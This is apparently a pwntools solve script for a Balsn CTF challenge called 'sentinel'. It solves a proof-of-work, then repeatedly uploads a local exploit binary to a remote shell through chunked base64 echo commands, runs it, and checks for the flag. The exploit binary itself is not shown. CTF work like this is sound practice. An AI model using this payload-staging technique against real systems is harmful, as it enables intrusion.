from pwn import *
import hashlib

###Util
def upload(lfname,fname,mode):
    chunkSize = 0x1000
    with open(lfname,'rb') as f:
        data = f.read()
    r.sendline(f'echo -n "" >{fname}.enc'.encode())
    L = len(data)
    for i in range(0,L,chunkSize):
        chunk = b64e(data[i:i+chunkSize])
        r.sendline(f'echo -n "{chunk}" >>{fname}.enc'.encode())
    r.sendline(f'base64 -d {fname}.enc >{fname}'.encode())
    r.sendline(f'rm {fname}.enc'.encode())
    r.sendline(f'chmod {mode} {fname}'.encode())

def doPow():
    challenge = r.recvline()
    challenge,difficulty = challenge.split(b"'")[1], int(challenge.split(b'<< ')[1].split(b')')[0])
    while True:
        res = int.from_bytes(hashlib.sha256(challenge+str(i).encode()).digest(),byteorder='little')&((1<<difficulty)-1)
        if i%100000==0:
            print(i,hex(res))
        if res==0:
            r.sendlineafter(b'answer > ',str(i).encode())
            return
        i+=1

def createInstance(secret):
    r.sendlineafter(b'Choice > ',b'1')
    doPow()
    if type(secret)==str:
        secret = secret.encode()
    r.sendlineafter(b'secret > ',secret)
    instanceId = r.recvuntil(b' (keep this for future reference)').split(b' ')[2].decode()
    r.recvuntil(b'done\r\n')
    return instanceId

def resumeInstance(instanceId,secret,reset=True):
    if reset is True:
        cmd = 3
    else:
        cmd = 2
    r.sendlineafter(b'Choice > ',str(cmd).encode())
    if type(instanceId)==str:
        instanceId = instanceId.encode()
    r.sendlineafter(b'instanceId > ',instanceId)
    if type(secret)==str:
        secret = secret.encode()
    r.sendlineafter(b'secret > ',secret)
    r.recvuntil(b'done\r\n')

def removeInstance(instanceId,secret):
    r.sendlineafter(b'Choice > ',b'4')
    if type(instanceId)==str:
        instanceId = instanceId.encode()
    r.sendlineafter(b'instanceId > ',instanceId)
    if type(secret)==str:
        secret = secret.encode()
    r.sendlineafter(b'secret > ',secret)


###Exploit
DOMAIN = 'sentinel.balsnctf.com'

r = remote(DOMAIN,10101)
instanceId = createInstance('dummySecret')
print(instanceId)
r.sendline(b'exit')
r.close()

i = 0
cnt = 0
while True:
    print('==============================')
    print(f'attempt {i}, success {cnt}')
    r = remote(DOMAIN,10101)
    resumeInstance(instanceId,'dummySecret')
    upload('./exp','/tmp/exp','700')
    r.sendline(b'echo "aaa"')
    res = r.recvuntil(b'aaa',timeout=10)    #IO sync
    if res==b'':
        r.close()
        break
    r.sendline(b'/tmp/exp')
    res = r.recvuntil(b'all done',timeout=10)
    r.sendline(b'echo "aaa"')
    if res==b'':
        r.close()
        break
    r.sendline(b'exit')
    res2 = r.recvuntil(b'aaa')  #IO sync
    r.close()
    print(res.decode())
    print(res2.decode())
    print('==============================')
    i+=1
    if b'BALSN' in res:
        cnt+=1
        break

r = remote(DOMAIN,10101)
removeInstance(instanceId,'dummySecret')
r.close()
